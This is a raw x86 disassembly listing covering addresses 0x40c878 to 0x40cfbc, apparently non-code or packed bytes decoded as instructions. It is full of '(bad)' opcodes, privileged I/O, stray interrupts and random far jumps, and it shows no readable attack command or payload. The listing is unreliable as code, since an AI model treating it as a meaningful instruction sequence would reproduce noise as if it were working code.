  40c878:	mov    bh,0xb5
  40c87a:	shr    DWORD PTR [esi],0xfa
  40c87d:	popa   
  40c87e:	test   al,0x71
  40c880:	cmp    al,0xd7
  40c882:	mov    esp,0x7fd0c37
  40c887:	pop    edi
  40c888:	aas    
  40c889:	je     0x40c87b
  40c88b:	lods   al,BYTE PTR ds:[esi]
  40c88c:	jo     0x40c8b0
  40c88e:	mov    cl,0xc1
  40c890:	movaps xmm3,XMMWORD PTR [ecx]
  40c893:	cmp    dl,BYTE PTR [edx-0x39290b15]
  40c899:	jge    0x40c888
  40c89b:	test   DWORD PTR [ecx],esp
  40c89d:	mov    esp,0xb1ef8286
  40c8a2:	shl    BYTE PTR [ebp+eax*8+0x58],0x68
  40c8a7:	call   0xe594b8af
  40c8ac:	add    ch,ah
  40c8ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8af:	or     bl,BYTE PTR [ecx-0x6a7e3da1]
  40c8b5:	cmp    eax,0x430d6768
  40c8ba:	inc    ecx
  40c8bb:	adc    dh,BYTE PTR [ebp+0x1e]
  40c8be:	inc    esi
  40c8bf:	cmp    DWORD PTR [edi+ebx*1],esp
  40c8c2:	jle    0x40c87e
  40c8c4:	sar    dh,1
  40c8c6:	sbb    BYTE PTR [ebp+0x57],cl
  40c8c9:	imul   edi,DWORD PTR ds:0x6116cbdc,0x74
  40c8d0:	dec    esp
  40c8d1:	int    0xd4
  40c8d3:	bound  ebp,QWORD PTR [edi-0x28088080]
  40c8d9:	and    eax,ecx
  40c8db:	not    BYTE PTR [ebp+edi*8-0x8]
  40c8df:	adc    DWORD PTR [edx+ebx*4-0x5ac6f34f],edi
  40c8e6:	fisubr WORD PTR [edi+0x40]
  40c8e9:	or     bl,dh
  40c8eb:	and    edi,DWORD PTR [eax-0x7ddc9aea]
  40c8f1:	jle    0x40c914
  40c8f3:	sub    eax,0x65e470ff
  40c8f8:	mov    ds:0x63c47bb1,al
  40c8fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8fe:	jne    0x40c8aa
  40c900:	mov    WORD PTR [edx+0x17f15696],?
  40c906:	pop    esp
  40c907:	fimul  DWORD PTR [ebp-0x5]
  40c90a:	inc    esp
  40c90b:	push   ebp
  40c90c:	jmp    0x40c891
  40c90e:	pop    ebx
  40c90f:	clc    
  40c910:	jns    0x40c8d7
  40c912:	mov    cl,0x9c
  40c914:	(bad)  
  40c915:	xor    cl,cl
  40c917:	dec    ebp
  40c918:	sub    eax,0x9cba30b9
  40c91d:	or     dh,BYTE PTR [edi-0x679913e2]
  40c923:	or     ebx,ebx
  40c925:	mov    al,ds:0x445d0071
  40c92a:	cmc    
  40c92b:	push   es
  40c92c:	xchg   ebp,eax
  40c92d:	shl    dl,0xdf
  40c930:	rcl    DWORD PTR ds:0xc213a942,cl
  40c936:	jg     0x40c952
  40c938:	in     al,0xc7
  40c93a:	addr16 dec esp
  40c93c:	mov    ecx,0x9af36f2d
  40c941:	sub    eax,esp
  40c943:	cmp    BYTE PTR [eax+eiz*2],bh
  40c946:	and    DWORD PTR [ecx-0x7b],edx
  40c949:	add    al,0xd4
  40c94b:	push   esi
  40c94c:	sbb    DWORD PTR [ebx],ebp
  40c94e:	xor    al,0xff
  40c950:	adc    al,0xe0
  40c952:	jnp    0x40c9b0
  40c954:	push   esp
  40c955:	pop    ss
  40c956:	popf   
  40c957:	jle    0x40c93a
  40c959:	scas   eax,DWORD PTR es:[edi]
  40c95a:	adc    BYTE PTR [eax+0x109cf721],ah
  40c960:	iret   
  40c961:	add    cl,BYTE PTR [esi]
  40c963:	or     cl,BYTE PTR [edx+0x339e8909]
  40c969:	push   ebp
  40c96a:	(bad)  
  40c96b:	jae    0x40c99b
  40c96d:	outs   dx,BYTE PTR gs:[esi]
  40c96f:	xor    cl,BYTE PTR [edx-0x78]
  40c972:	lds    ecx,FWORD PTR [ecx]
  40c974:	add    dl,BYTE PTR [eax-0x7b343a5c]
  40c97a:	lods   eax,DWORD PTR ds:[esi]
  40c97b:	push   eax
  40c97c:	inc    edi
  40c97d:	mov    ds,WORD PTR [ebx+ebp*8-0x3a]
  40c981:	out    dx,eax
  40c982:	dec    ecx
  40c983:	sub    al,0xe4
  40c985:	ss push esi
  40c987:	lea    ebx,[ebx-0x5a]
  40c98a:	int    0x4e
  40c98c:	hlt    
  40c98d:	or     DWORD PTR [edi-0x66],0x10894525
  40c994:	pop    ds
  40c995:	stos   DWORD PTR es:[edi],eax
  40c996:	jg     0x40c9e7
  40c998:	pop    ebp
  40c999:	push   cs
  40c99a:	pop    edi
  40c99b:	fcomp  DWORD PTR [edx+0x78]
  40c99e:	scas   eax,DWORD PTR es:[edi]
  40c99f:	push   ebp
  40c9a0:	dec    ebp
  40c9a1:	jnp    0x40c941
  40c9a3:	xchg   DWORD PTR [eax+0x10],ecx
  40c9a6:	js     0x40c979
  40c9a8:	cmc    
  40c9a9:	xchg   edi,eax
  40c9aa:	mov    dh,0xe4
  40c9ac:	repnz ss (bad) 
  40c9af:	int    0x27
  40c9b1:	mov    es,WORD PTR [edi+0x47]
  40c9b4:	push   0xf5fb827c
  40c9b9:	das    
  40c9ba:	cmc    
  40c9bb:	jmp    0x7260:0xad33c42
  40c9c2:	imul   eax,DWORD PTR [eax+0x7e],0x6349b3bf
  40c9c9:	std    
  40c9ca:	mov    BYTE PTR [ebx],dh
  40c9cc:	jae    0x40c9f7
  40c9ce:	dec    ecx
  40c9cf:	mov    DWORD PTR [edx],ecx
  40c9d1:	xor    BYTE PTR [eax+0x1dfa9f2b],al
  40c9d7:	cmp    ecx,DWORD PTR [esi]
  40c9d9:	ins    DWORD PTR es:[edi],dx
  40c9da:	fnstcw WORD PTR ds:0xeb6b1881
  40c9e0:	sbb    DWORD PTR [ebx+0x406bc46a],ecx
  40c9e6:	xor    DWORD PTR [esi+0x368d45ad],esi
  40c9ec:	dec    edx
  40c9ed:	xor    esp,DWORD PTR [esi-0xe]
  40c9f0:	popa   
  40c9f1:	test   al,0x66
  40c9f3:	popa   
  40c9f4:	inc    ebp
  40c9f5:	mov    eax,ds:0xb20e4690
  40c9fa:	pop    esi
  40c9fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9fc:	out    0x71,al
  40c9fe:	adc    BYTE PTR [ecx],dl
  40ca00:	add    DWORD PTR [ebp-0x7a],0xa5db5521
  40ca07:	imul   edx,esi,0x8fb73fed
  40ca0d:	xor    BYTE PTR [ebp+0x14],0x20
  40ca11:	xchg   edx,eax
  40ca12:	fidivr DWORD PTR [eax+0x70970166]
  40ca18:	jbe    0x40ca01
  40ca1a:	xchg   ecx,eax
  40ca1b:	and    eax,esi
  40ca1d:	mov    cl,0x79
  40ca1f:	retf   0x86ee
  40ca22:	or     eax,0x3e2d5b3b
  40ca27:	jmp    0xd069:0x2112a229
  40ca2e:	repz inc ebx
  40ca30:	push   ebp
  40ca31:	call   0x911a7bdf
  40ca36:	push   ebx
  40ca37:	jns    0x40ca8a
  40ca39:	push   ds
  40ca3a:	or     BYTE PTR [edx],dl
  40ca3c:	retf   0x9a82
  40ca3f:	xor    edx,esi
  40ca41:	push   esp
  40ca42:	rcl    bl,0x7c
  40ca45:	mov    cl,BYTE PTR [eax]
  40ca47:	retf   0x2270
  40ca4a:	loopne 0x40c9f8
  40ca4c:	mov    ah,0xfa
  40ca4e:	(bad)  
  40ca4f:	dec    edi
  40ca50:	pop    esi
  40ca51:	jp     0x40ca98
  40ca53:	and    eax,0x9dfd0d95
  40ca58:	dec    ecx
  40ca59:	not    edi
  40ca5b:	inc    edx
  40ca5c:	aas    
  40ca5d:	inc    ecx
  40ca5e:	idiv   BYTE PTR [esi+esi*2+0x37353ca1]
  40ca65:	repz xchg edi,eax
  40ca67:	cli    
  40ca68:	sub    esp,DWORD PTR [eax]
  40ca6a:	pop    edx
  40ca6b:	pop    edi
  40ca6c:	mov    ah,ah
  40ca6e:	mov    cl,0x89
  40ca70:	xchg   esp,eax
  40ca71:	pop    ebp
  40ca72:	iret   
  40ca73:	jecxz  0x40ca71
  40ca75:	imul   edi,DWORD PTR [edx+0x12f48fca],0xffffff96
  40ca7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca7d:	int3   
  40ca7e:	xor    edi,ebp
  40ca80:	xor    ch,al
  40ca82:	aaa    
  40ca83:	lock popf 
  40ca85:	fisttp DWORD PTR [ecx-0x78e6c2e2]
  40ca8b:	psubsb mm5,QWORD PTR [eax+0x4b]
  40ca8f:	push   0x553451fc
  40ca94:	add    al,0x94
  40ca96:	mov    cl,0xbd
  40ca98:	jae    0x40ca94
  40ca9a:	and    DWORD PTR [edi+0x2b],eax
  40ca9d:	(bad)  
  40ca9e:	in     al,dx
  40ca9f:	fucomip st,st(3)
  40caa1:	data16 xchg dl,ah
  40caa4:	lds    edi,FWORD PTR [ecx]
  40caa6:	adc    al,0x39
  40caa8:	mov    ebx,0x85e4d2ca
  40caad:	xor    eax,0xd6fbc1b8
  40cab2:	jle    0x40cb04
  40cab4:	dec    edx
  40cab5:	test   BYTE PTR [ebx-0x57],0x44
  40cab9:	xor    ch,BYTE PTR [ecx-0x79d32c5b]
  40cabf:	pop    edi
  40cac0:	add    al,0xf3
  40cac2:	xchg   BYTE PTR [edx+0x3],dl
  40cac5:	ins    BYTE PTR es:[edi],dx
  40cac6:	jns    0x40ca64
  40cac8:	jmp    0x15a0:0x86b29bd4
  40cacf:	fidivr WORD PTR [edx]
  40cad1:	adc    esi,DWORD PTR [edi-0x5f]
  40cad4:	pop    eax
  40cad5:	int3   
  40cad6:	mov    ebp,0x729d9040
  40cadb:	pop    ds
  40cadc:	leave  
  40cadd:	clc    
  40cade:	mov    ebx,0xcab61cfa
  40cae3:	pop    eax
  40cae4:	jle    0x40cb57
  40cae6:	jle    0x40cb40
  40cae8:	daa    
  40cae9:	rol    DWORD PTR [ecx+0x140328fc],cl
  40caef:	data16 or ch,BYTE PTR [edi]
  40caf2:	jle    0x40cb50
  40caf4:	ds ins BYTE PTR es:[edi],dx
  40caf6:	mul    BYTE PTR [esi]
  40caf8:	call   0x9c7f:0x603ac5c8
  40caff:	in     eax,0xbf
  40cb01:	bswap  esi
  40cb03:	pop    ss
  40cb04:	adc    al,0x23
  40cb06:	test   eax,0xf9e3ce49
  40cb0b:	fs sub al,0xd0
  40cb0e:	scas   eax,DWORD PTR es:[edi]
  40cb0f:	add    cl,bl
  40cb11:	xchg   ecx,eax
  40cb12:	and    bh,bh
  40cb14:	int    0xfb
  40cb16:	cmp    cl,BYTE PTR [ecx]
  40cb18:	popa   
  40cb19:	push   ebp
  40cb1a:	xchg   ecx,edx
  40cb1c:	cwde   
  40cb1d:	xchg   DWORD PTR [ebx],edi
  40cb1f:	push   eax
  40cb20:	out    0xbc,eax
  40cb22:	cdq    
  40cb23:	test   eax,0xb9a0bf92
  40cb28:	es fwait
  40cb2a:	lock cmp BYTE PTR [ebx-0xe528e1b],dh
  40cb31:	lock stc 
  40cb33:	popa   
  40cb34:	push   0x96c428ac
  40cb39:	push   0xeb957693
  40cb3e:	lds    esi,FWORD PTR [edx+0x46]
  40cb41:	outs   dx,BYTE PTR ds:[esi]
  40cb42:	jae    0x40cb7a
  40cb44:	icebp  
  40cb45:	bound  ebp,QWORD PTR [ecx+0x23547618]
  40cb4b:	adc    edi,ebx
  40cb4d:	jo     0x40cb5b
  40cb4f:	mov    ah,0xa1
  40cb51:	mov    ds:0xd0636633,al
  40cb56:	in     eax,dx
  40cb57:	inc    ecx
  40cb58:	ret    
  40cb59:	xor    al,0xaf
  40cb5b:	cs ret 
  40cb5d:	pop    ds
  40cb5e:	mov    edi,0x8912817f
  40cb63:	jb     0x40caf4
  40cb65:	addr16 jge 0x40cb0b
  40cb68:	pop    ds
  40cb69:	inc    ebx
  40cb6a:	sbb    eax,0x39804c15
  40cb6f:	out    dx,eax
  40cb70:	test   al,0x7
  40cb72:	push   ds
  40cb73:	jmp    0xb4fd4b11
  40cb78:	mov    al,BYTE PTR [ebx+0x56]
  40cb7b:	test   BYTE PTR [edi+0x710489ba],bl
  40cb81:	mov    ah,0x85
  40cb83:	adc    DWORD PTR [esi-0x65cb35d1],ebx
  40cb89:	fimul  WORD PTR [ebx]
  40cb8b:	ja     0x40cb0f
  40cb8d:	loopne 0x40cc0a
  40cb8f:	in     al,dx
  40cb90:	jmp    0x40cb7e
  40cb92:	loop   0x40cbe3
  40cb94:	lock hlt 
  40cb96:	int    0xd0
  40cb98:	mov    ecx,0xeae57c6c
  40cb9d:	jge    0x40cb3a
  40cb9f:	bound  eax,QWORD PTR [edi]
  40cba1:	mov    ah,0x7e
  40cba3:	int    0xe
  40cba5:	sar    DWORD PTR ds:0xa5862336,1
  40cbab:	js     0x40cbb8
  40cbad:	jp     0x40cc0d
  40cbaf:	cmp    BYTE PTR [esp+esi*4],bl
  40cbb2:	fmul   QWORD PTR ds:0xa10fdf3e
  40cbb8:	xchg   esp,eax
  40cbb9:	adc    eax,0xf7d18f23
  40cbbe:	jbe    0x40cb97
  40cbc0:	mov    DWORD PTR [edx+ebx*2],ecx
  40cbc3:	mov    ds:0xa564e271,al
  40cbc8:	outs   dx,DWORD PTR ds:[esi]
  40cbc9:	xchg   BYTE PTR [ecx+0x4dcd2d7c],al
  40cbcf:	jg     0x40cb81
  40cbd1:	mov    ds:0xf5fb418f,eax
  40cbd6:	js     0x40cb90
  40cbd8:	sbb    DWORD PTR [esi],esp
  40cbda:	leave  
  40cbdb:	xor    eax,0x4735653c
  40cbe0:	aad    0x5
  40cbe2:	icebp  
  40cbe3:	inc    edi
  40cbe4:	scas   eax,DWORD PTR es:[edi]
  40cbe5:	(bad)  
  40cbe6:	xchg   ebx,eax
  40cbe7:	cmp    esp,eax
  40cbe9:	or     al,BYTE PTR [ebp-0xbbded2f]
  40cbef:	cli    
  40cbf0:	mov    ebp,0xc507c3bc
  40cbf5:	adc    dl,0x91
  40cbf8:	mov    ebp,DWORD PTR [esi]
  40cbfa:	call   0xe63d:0x3c649d5d
  40cc01:	dec    ebx
  40cc02:	xor    edx,ebp
  40cc04:	inc    ebp
  40cc05:	nop
  40cc06:	mov    edx,DWORD PTR [ecx+0x72cde985]
  40cc0c:	inc    ebx
  40cc0e:	sub    eax,0x73e10d06
  40cc13:	push   0x34d00f09
  40cc18:	or     ecx,ecx
  40cc1a:	push   esi
  40cc1b:	cmp    BYTE PTR [edx+eiz*1-0x77],dl
  40cc1f:	mov    ?,WORD PTR [ebp-0x49]
  40cc22:	cdq    
  40cc23:	pop    edi
  40cc24:	(bad)  
  40cc25:	jmp    0xe6eb907
  40cc2a:	imul   esi,DWORD PTR [edi+eax*1],0xf9ff4c14
  40cc31:	int3   
  40cc32:	std    
  40cc33:	daa    
  40cc34:	sbb    DWORD PTR [esi],ecx
  40cc36:	mov    BYTE PTR [ebp-0x20],cl
  40cc39:	lock loope 0x40cc02
  40cc3c:	outs   dx,BYTE PTR ds:[esi]
  40cc3d:	retf   
  40cc3e:	pop    ebp
  40cc3f:	sbb    eax,0x198ac327
  40cc44:	icebp  
  40cc45:	sbb    eax,0xd7619136
  40cc4a:	ror    DWORD PTR ds:0x344cebd6,1
  40cc50:	or     bl,BYTE PTR [ecx]
  40cc52:	dec    DWORD PTR [ebp+esi*4+0x5a]
  40cc56:	call   0xcbe3f9f4
  40cc5b:	in     eax,dx
  40cc5c:	or     BYTE PTR [esi+ecx*8-0x64],bl
  40cc60:	push   ebx
  40cc61:	(bad)  
  40cc63:	fnsave [ebp+0x5ef65c57]
  40cc69:	retf   
  40cc6a:	retf   
  40cc6b:	out    0xad,eax
  40cc6d:	fisttp DWORD PTR [ebp-0x6a5b8284]
  40cc73:	scas   al,BYTE PTR es:[edi]
  40cc74:	aaa    
  40cc75:	iret   
  40cc76:	(bad)  
  40cc77:	into   
  40cc78:	xchg   esi,eax
  40cc79:	jmp    0xcde44dd2
  40cc7e:	fcom   QWORD PTR [edi-0x4b]
  40cc81:	clc    
  40cc82:	(bad)  
  40cc83:	xor    eax,0x5574a6f
  40cc88:	and    al,0x79
  40cc8a:	push   esp
  40cc8b:	es stos DWORD PTR es:[edi],eax
  40cc8d:	push   edi
  40cc8e:	sbb    ebp,esp
  40cc90:	jmp    0x8d5c:0xbfa61a87
  40cc97:	push   ds
  40cc98:	xchg   ecx,eax
  40cc99:	mov    cl,bh
  40cc9b:	int    0x6f
  40cc9d:	lods   al,BYTE PTR ds:[esi]
  40cc9e:	inc    ecx
  40cc9f:	adc    eax,0xfd144db6
  40cca4:	into   
  40cca5:	in     al,0x5e
  40cca7:	je     0x40cc4d
  40cca9:	push   esp
  40ccaa:	sub    DWORD PTR [ebx],ebx
  40ccac:	push   esi
  40ccad:	jg     0x40ccdd
  40ccaf:	jp     0x40cc9a
  40ccb1:	mov    ds:0x968b069a,al
  40ccb6:	test   DWORD PTR [edi-0x77],edx
  40ccb9:	or     ecx,DWORD PTR [ebx-0x538c393d]
  40ccbf:	push   es
  40ccc0:	ins    DWORD PTR es:[edi],dx
  40ccc1:	sbb    eax,0x9a291b8a
  40ccc6:	into   
  40ccc7:	dec    ebp
  40ccc8:	ss jns 0x40cd37
  40cccb:	sub    eax,0xf4289233
  40ccd0:	leave  
  40ccd1:	mov    edi,0xc4ef7990
  40ccd6:	mov    edx,0x1dabef79
  40ccdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccdc:	test   eax,0xb52e0c28
  40cce1:	inc    esp
  40cce2:	dec    ebx
  40cce3:	lahf   
  40cce4:	jno    0x40cd4b
  40cce6:	mov    edx,0x6ab1ebe6
  40cceb:	sub    esp,eax
  40cced:	ja     0x40cce2
  40ccef:	lods   al,BYTE PTR ds:[esi]
  40ccf0:	pop    ds
  40ccf1:	in     eax,0x7
  40ccf3:	cmp    al,0x22
  40ccf5:	test   DWORD PTR [ebx],edi
  40ccf7:	push   edi
  40ccf8:	sar    BYTE PTR [edx+0x4210537e],1
  40ccfe:	inc    ebx
  40ccff:	out    dx,al
  40cd00:	inc    edx
  40cd01:	pop    ds
  40cd02:	aam    0x9
  40cd04:	(bad)  
  40cd05:	fistp  DWORD PTR ds:0x4fe74ef5
  40cd0b:	aas    
  40cd0c:	mov    dh,0x1e
  40cd0e:	cmp    bh,BYTE PTR [ecx]
  40cd10:	inc    esp
  40cd11:	lea    ebx,[eax]
  40cd13:	inc    ebx
  40cd14:	out    dx,eax
  40cd15:	push   0x28
  40cd17:	jno    0x40ccc2
  40cd19:	stos   DWORD PTR es:[edi],eax
  40cd1a:	pop    edx
  40cd1b:	mov    WORD PTR [ebx-0x12439691],cs
  40cd21:	fs aam 0x1e
  40cd24:	or     edi,DWORD PTR [ecx+ebp*8+0x47]
  40cd28:	mov    ah,0x53
  40cd2a:	sbb    bl,ah
  40cd2c:	jge    0x40ccea
  40cd2e:	cdq    
  40cd2f:	lds    edx,FWORD PTR [edx-0x596cbde8]
  40cd35:	out    dx,al
  40cd36:	sbb    al,0xc2
  40cd38:	pop    ds
  40cd39:	shl    edi,0xaa
  40cd3c:	cmp    ch,BYTE PTR [ebp-0xa8af7c0]
  40cd42:	adc    BYTE PTR [edi-0x26d5b9f2],bh
  40cd48:	mov    edx,0x9386616
  40cd4d:	or     al,0xfb
  40cd4f:	cmp    eax,0xeb1ff3dc
  40cd54:	mov    ecx,0xdc45dd19
  40cd59:	jg     0x40cd41
  40cd5b:	pusha  
  40cd5c:	sbb    ecx,0x11
  40cd5f:	sbb    esp,DWORD PTR ds:0x18a8a840
  40cd65:	sbb    al,0xd0
  40cd67:	xchg   DWORD PTR [ecx-0x15],eax
  40cd6a:	xchg   ecx,eax
  40cd6b:	rcr    DWORD PTR [ebp+0x3e],0x5c
  40cd6f:	and    edi,ebp
  40cd71:	cmp    edx,DWORD PTR [eax]
  40cd73:	stos   DWORD PTR es:[edi],eax
  40cd74:	jne    0x40cd43
  40cd76:	push   cs
  40cd77:	jb     0x40cd7b
  40cd79:	mov    ds:0x17d6e30,eax
  40cd7e:	jmp    ecx
  40cd80:	push   eax
  40cd81:	out    dx,al
  40cd82:	pop    ds
  40cd83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd84:	inc    eax
  40cd85:	sbb    al,0xb5
  40cd88:	adc    BYTE PTR [ebx-0x37],bl
  40cd8b:	mov    ah,0x7d
  40cd8d:	jns    0x40cd6f
  40cd8f:	mov    ds:0x36e55a27,eax
  40cd94:	lods   al,BYTE PTR ds:[esi]
  40cd95:	jns    0x40cd63
  40cd97:	pop    es
  40cd98:	clc    
  40cd99:	pusha  
  40cd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd9b:	ret    0xb94a
  40cd9e:	dec    ebp
  40cd9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cda0:	xor    al,0xa9
  40cda2:	cmc    
  40cda3:	push   esp
  40cda4:	sar    BYTE PTR ds:0xf66fc153,cl
  40cdaa:	into   
  40cdab:	call   0x6887:0x534a6d44
  40cdb2:	sar    bl,0x9
  40cdb5:	cmc    
  40cdb6:	mov    al,ah
  40cdb8:	or     BYTE PTR [eax],cl
  40cdba:	fadd   st(3),st
  40cdbc:	push   ecx
  40cdbd:	or     edi,DWORD PTR [eax-0x2c]
  40cdc0:	retf   0xb4b5
  40cdc3:	in     al,0xa5
  40cdc5:	std    
  40cdc6:	(bad)  
  40cdc7:	shl    BYTE PTR ds:0xcc595f7e,1
  40cdcd:	je     0x40cd5d
  40cdcf:	sbb    BYTE PTR [edi+0x2569a358],bl
  40cdd5:	stos   BYTE PTR es:[edi],al
  40cdd6:	pop    ecx
  40cdd7:	bound  edx,QWORD PTR [eax+0x5792a535]
  40cddd:	xchg   esp,eax
  40cdde:	mov    ebx,0x89738de2
  40cde3:	adc    BYTE PTR [ebx+0x3c],ch
  40cde6:	and    bl,al
  40cde8:	jns    0x40cde5
  40cdea:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdec:	clc    
  40cded:	inc    esi
  40cdee:	sbb    al,0x37
  40cdf0:	ror    BYTE PTR [edx],0xbd
  40cdf3:	pop    ebp
  40cdf4:	sub    BYTE PTR [edx+eiz*2-0x78],cl
  40cdf8:	sbb    DWORD PTR [ebp-0x123a88cf],0x67
  40cdff:	inc    ebp
  40ce00:	jl     0x40ce19
  40ce02:	adc    eax,0x96497e1f
  40ce07:	push   0xffffffb3
  40ce09:	mov    eax,ebp
  40ce0b:	push   es
  40ce0c:	ror    bh,cl
  40ce0e:	pop    ds
  40ce0f:	push   cs
  40ce10:	ffreep st(3)
  40ce12:	fimul  WORD PTR [edi]
  40ce14:	xchg   edi,eax
  40ce15:	rol    BYTE PTR ds:[ecx+0x4e5b6b3c],1
  40ce1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce1d:	push   ebp
  40ce1e:	dec    ecx
  40ce1f:	dec    esi
  40ce20:	loop   0x40ce61
  40ce22:	call   0x3142567a
  40ce27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce28:	mov    WORD PTR [edi+0x1b],ss
  40ce2b:	mov    dl,0x9b
  40ce2d:	fcom   st(3)
  40ce2f:	(bad)  
  40ce30:	sti    
  40ce31:	cld    
  40ce32:	bound  eax,QWORD PTR [eax-0x4cb5c306]
  40ce38:	jo     0x40cdd7
  40ce3a:	or     esi,edx
  40ce3c:	mov    esp,DWORD PTR [ebx-0x79]
  40ce3f:	xchg   dl,ah
  40ce41:	xchg   edx,eax
  40ce42:	ret    
  40ce43:	xor    BYTE PTR [ebx-0x2f],0x14
  40ce47:	mov    ch,0x13
  40ce49:	mov    eax,ds:0x2893a9fd
  40ce4e:	and    esp,edi
  40ce50:	popa   
  40ce51:	mov    ebp,fs
  40ce53:	mov    ?,WORD PTR [ebx-0x7f796640]
  40ce59:	cmp    DWORD PTR [esi-0x55],ebx
  40ce5c:	jg     0x40ce8d
  40ce5e:	add    al,0x5
  40ce60:	test   DWORD PTR [esi+0x3b],esi
  40ce63:	push   ss
  40ce64:	xchg   ebx,eax
  40ce65:	add    BYTE PTR [ecx+eiz*1],bh
  40ce68:	arpl   WORD PTR [edx],sp
  40ce6a:	stos   DWORD PTR es:[edi],eax
  40ce6b:	mov    edx,ebp
  40ce6d:	lahf   
  40ce6e:	xchg   DWORD PTR [edx+0xe],edx
  40ce71:	cmp    eax,0x46580d9b
  40ce76:	add    DWORD PTR [edx-0x51],esi
  40ce79:	sub    ebp,DWORD PTR [esi-0x7c4d9bb6]
  40ce7f:	dec    ax
  40ce81:	mov    edi,0x7564066f
  40ce86:	jp     0x40ceec
  40ce88:	jbe    0x40ce2d
  40ce8a:	loopne 0x40ce98
  40ce8c:	push   edx
  40ce8d:	shl    DWORD PTR [eax-0x3b258d5e],cl
  40ce93:	js     0x40ce59
  40ce95:	pop    ds
  40ce96:	daa    
  40ce97:	xlat   BYTE PTR ds:[ebx]
  40ce98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce99:	push   ebp
  40ce9a:	call   0xe281af30
  40ce9f:	push   ecx
  40cea0:	test   eax,0xadb6033e
  40cea5:	xor    al,BYTE PTR [eax-0x7b]
  40cea8:	or     BYTE PTR [ebx],cl
  40ceaa:	inc    ebp
  40ceab:	xor    dh,dl
  40cead:	xor    DWORD PTR [ebx-0x19e651a1],ebx
  40ceb3:	push   edx
  40ceb4:	rol    DWORD PTR ds:0x2a24e187,cl
  40ceba:	pop    ss
  40cebb:	fldcw  WORD PTR [edx+ebp*8-0x3b]
  40cebf:	js     0x40ceeb
  40cec1:	or     al,0xd2
  40cec3:	and    cl,cl
  40cec5:	and    eax,0x6148c0a8
  40ceca:	sub    ch,bh
  40cecc:	shl    ebx,1
  40cece:	and    ebx,esi
  40ced0:	lods   al,BYTE PTR ds:[esi]
  40ced1:	scas   al,BYTE PTR es:[edi]
  40ced2:	das    
  40ced3:	cmc    
  40ced4:	test   DWORD PTR [eax+0x744cedf],0xf4e9411b
  40cede:	xlat   BYTE PTR ds:[ebx]
  40cedf:	xlat   BYTE PTR ds:[ebx]
  40cee0:	cs out 0xc0,al
  40cee3:	in     eax,0x2b
  40cee5:	daa    
  40cee6:	ja     0x40ceb0
  40cee8:	shl    BYTE PTR [edx-0x1a],cl
  40ceeb:	prefetch (bad)
  40ceec:	or     eax,0xfb83e9e2
  40cef1:	shl    DWORD PTR [edi],cl
  40cef3:	or     BYTE PTR [ecx],0x45
  40cef6:	add    eax,0xc853bf89
  40cefb:	dec    ecx
  40cefc:	push   eax
  40cefd:	cdq    
  40cefe:	lods   al,BYTE PTR ds:[esi]
  40ceff:	in     al,dx
  40cf00:	fs pushf 
  40cf02:	rcl    ch,0xb3
  40cf05:	or     cl,cl
  40cf07:	mov    ds:0x8dfcb420,eax
  40cf0c:	(bad)  
  40cf0d:	mov    bh,0x8a
  40cf0f:	stc    
  40cf10:	fs xor ecx,ebp
  40cf13:	mov    al,0xb6
  40cf15:	clc    
  40cf16:	push   cs
  40cf17:	push   es
  40cf18:	call   DWORD PTR [edi+0x4a]
  40cf1b:	add    esi,DWORD PTR [ecx]
  40cf1d:	jmp    0xb2c00efd
  40cf22:	fdivr  QWORD PTR [ecx-0x46]
  40cf25:	mov    bh,0x49
  40cf27:	rcl    DWORD PTR [edx+0x56],1
  40cf2a:	mov    al,0x9b
  40cf2c:	outs   dx,BYTE PTR ds:[esi]
  40cf2d:	pop    edi
  40cf2e:	popf   
  40cf2f:	xor    ecx,DWORD PTR [eax+0x69d21e94]
  40cf35:	out    0xa8,al
  40cf37:	cwde   
  40cf38:	not    DWORD PTR [edi]
  40cf3a:	(bad)  [eax]
  40cf3c:	fdivr  DWORD PTR [edi-0xa38ffb5]
  40cf42:	adc    DWORD PTR [esi-0x54],ebp
  40cf45:	inc    esi
  40cf46:	loop   0x40cf1e
  40cf48:	stos   DWORD PTR es:[edi],eax
  40cf49:	scas   eax,DWORD PTR es:[edi]
  40cf4a:	and    ebp,edi
  40cf4c:	outs   dx,DWORD PTR ds:[esi]
  40cf4d:	cli    
  40cf4e:	xchg   ebx,eax
  40cf4f:	call   0x9df2875e
  40cf54:	sub    dh,BYTE PTR [eax-0x71]
  40cf57:	ret    
  40cf58:	push   ecx
  40cf59:	int3   
  40cf5a:	and    BYTE PTR [edx-0x37],0x67
  40cf5e:	add    bh,ah
  40cf60:	mov    ch,0x3b
  40cf62:	retf   0xaff0
  40cf65:	and    ch,BYTE PTR [edx]
  40cf67:	(bad)  
  40cf69:	cmp    eax,0x459557ce
  40cf6e:	xchg   edi,eax
  40cf6f:	mov    dl,0x70
  40cf71:	repz push ebp
  40cf73:	and    DWORD PTR [ebp-0x14],0x871092a4
  40cf7a:	and    ebx,esp
  40cf7c:	mov    ebp,0x780a0fec
  40cf81:	ins    BYTE PTR es:[edi],dx
  40cf82:	sbb    edx,0x52
  40cf85:	cld    
  40cf86:	and    eax,0x19df1293
  40cf8b:	fmul   DWORD PTR [ebp+0x14]
  40cf8e:	std    
  40cf8f:	pop    ebx
  40cf90:	xchg   esp,eax
  40cf91:	mov    al,ds:0x3861813f
  40cf96:	imul   ebp,esp,0x5cd14583
  40cf9c:	pop    ebp
  40cf9d:	add    ebx,ebx
  40cf9f:	sti    
  40cfa0:	(bad)  
  40cfa1:	jae    0x40cf67
  40cfa3:	mov    BYTE PTR [esp+ecx*2+0x18d7b4f9],bh
  40cfaa:	(bad)  
  40cfac:	aam    0xd0
  40cfae:	in     al,dx
  40cfaf:	pop    es
  40cfb0:	inc    edx
  40cfb1:	adc    eax,0x34623f64
  40cfb6:	add    ch,BYTE PTR [ecx+0x4144de10]
  40cfbc:	les    ebx,FWORD PTR [eax-0x16]
